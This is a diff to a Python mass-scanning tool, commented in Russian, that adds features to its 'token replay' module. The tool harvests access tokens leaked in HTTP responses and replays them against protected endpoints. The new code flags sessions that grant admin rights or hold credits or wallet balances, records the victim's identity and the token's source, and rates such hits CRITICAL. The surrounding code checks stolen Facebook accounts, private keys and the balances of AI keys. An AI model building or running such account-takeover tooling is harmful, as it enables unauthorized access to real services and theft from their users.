@@ -470,6 +470,19 @@ FUZZ_FIELD_RE = re.compile(r'(?:^|_)(?:ids?|uuids?|guid|slug|username|user_login
 # token replay: access_token из 200-тел (напр. GET /api/efi/_debug/authorize)
 # подставляется в protected GET (401/403) как Authorization: Bearer
 TOKEN_RE_RE = re.compile(r'"(?:access_token|accessToken)"\s*:\s*"([^"\s]{16,512})"')
+# replay открыл админскую сессию: роль админа/суперюзера (строка или в
+# массиве roles) или /admin/* путь
+REPLAY_ADMIN_RE = re.compile(
+    r'"(?:role|user_role|roles?)"\s*:\s*"?(?:admin|superadmin|super_admin|superuser|administrator)"?'
+    r'|"(?:role|user_role|roles)"\s*:\s*\[[^\]]{0,120}?(?:admin|superadmin|super_admin|superuser)'
+    r'|"(?:is_admin|is_superuser|is_super_admin)"\s*:\s*(?:true|1)\b', re.I)
+# replay открыл сессию с деньгами: credits/balance > 0
+REPLAY_MONEY_RE = re.compile(
+    r'"(?:credits?|balance|credit_balance|available_credits?|wallet_balance|points)"'
+    r'\s*:\s*"?([0-9]+(?:\.[0-9]+)?)"?', re.I)
+# личность открытой сессии (name/email/username из /me-ответов)
+REPLAY_ID_RE = re.compile(
+    r'"(?:name|email|username|user_name|login)"\s*:\s*"([^"@]{3,80})"', re.I)
 
 
 def _fuzz_candidates(param: str, buckets: dict, cap: int) -> list[str]:
@@ -578,6 +591,9 @@ SEVERITY_MAP = {
     # верифицированные аккаунты/деньги
     "facebook_valid": "HIGH",
     "private_key_money": "CRITICAL",
+    # replay открыл админскую сессию или с деньгами (credits/balance)
+    "token_replay_admin": "CRITICAL",
+    "token_replay_money": "CRITICAL",
     # is_admin в ответе + фактический вход (путь /admin/* или токен рядом)
     "admin_area": "CRITICAL",
     "admin_access": "CRITICAL",
@@ -831,7 +847,9 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
             integration_panel_seen: bool = False
             # token replay: access_token'ы из тел + protected GET (401/403)
             auth_tokens_found: list[str] = []
+            auth_token_sources: dict[str, str] = {}
             protected_gets: list[tuple[str, str]] = []
+            token_replay_checks: list[dict[str, Any]] = []
             # id-fuzz: id'шники из тел + GET-шаблоны с {param} для фазы 2
             fuzz_buckets: dict[str, set[str]] = {}
             param_templates_seen: set[str] = set()
@@ -971,6 +989,8 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                         if tok not in auth_tokens_found \
                                                 and len(auth_tokens_found) < cfg.token_replay_max:
                                             auth_tokens_found.append(tok)
+                                            # источник токена (где утёк) для панели
+                                            auth_token_sources.setdefault(tok, path_template)
                                 if cfg.wp_checks:
                                     # маркер + извлечение пар (url можно взять из entry);
                                     # без закрывающей кавычки - ловит и wp_username
@@ -1208,6 +1228,14 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
             # рабочие токены (token_replay CRITICAL). Только GET - пассивно.
             if cfg.token_replay and auth_tokens_found and protected_gets:
                 replay_seen: set[tuple[str, str]] = set()
+                # per-token агрегатор: что именно открыл токен (для панели)
+                tr_by_token: dict[str, dict[str, Any]] = {
+                    tok: {"token": tok, "source": auth_token_sources.get(tok, ""),
+                          "opened": [], "admin": False, "money": False,
+                          "money_value": "", "identity": ""}
+                    for tok in auth_tokens_found
+                }
+                token_replay_checks: list[dict[str, Any]] = []
                 for tmpl, ppath in protected_gets:
                     if time.monotonic() >= deadline:
                         break
@@ -1230,6 +1258,29 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                     continue
                                 rbody = await rresp.text()
                                 rpatterns, rsev = classify_response(rbody[:100_000])
+                                # что за сессия открылась: админ / деньги / личность
+                                tr = tr_by_token.get(tok) or {}
+                                if tr:
+                                    tr["opened"].append(ppath.split("#")[0])
+                                    if REPLAY_ADMIN_RE.search(rbody[:2000]) \
+                                            or "/admin" in (tmpl + ppath).lower():
+                                        tr["admin"] = True
+                                        if "token_replay_admin" not in rpatterns:
+                                            rpatterns.append("token_replay_admin")
+                                    mm = REPLAY_MONEY_RE.search(rbody[:2000])
+                                    if mm:
+                                        try:
+                                            if float(mm.group(1)) > 0:
+                                                tr["money"] = True
+                                                tr["money_value"] = mm.group(1)
+                                                if "token_replay_money" not in rpatterns:
+                                                    rpatterns.append("token_replay_money")
+                                        except ValueError:
+                                            pass
+                                    if not tr["identity"]:
+                                        idm = REPLAY_ID_RE.search(rbody[:2000])
+                                        if idm:
+                                            tr["identity"] = idm.group(1)[:80]
                                 # закрытый эндпоинт открылся токеном - finding
                                 if "token_replay" not in rpatterns:
                                     rpatterns.append("token_replay")
@@ -1288,6 +1339,9 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                         ai_keys_found.setdefault(k, prov)
                         except (aiohttp.ClientError, asyncio.TimeoutError):
                             continue
+                # в result.data идут только токены, реально открывшие
+                # защищённые эндпоинты (с identity/admin/money-атрибутами)
+                token_replay_checks = [tr for tr in tr_by_token.values() if tr["opened"]]
 
             # Проверка AI-ключей: валидность/баланс у провайдеров
             # (только бесплатные эндпоинты - списания нет)
@@ -1632,6 +1686,7 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                 "wp_checks": wp_checks,
                 "facebook_checks": facebook_checks,
                 "key_balance_checks": key_balance_checks,
+                "token_replay_checks": token_replay_checks,
                 "integration_checks": integration_checks,
             }
 
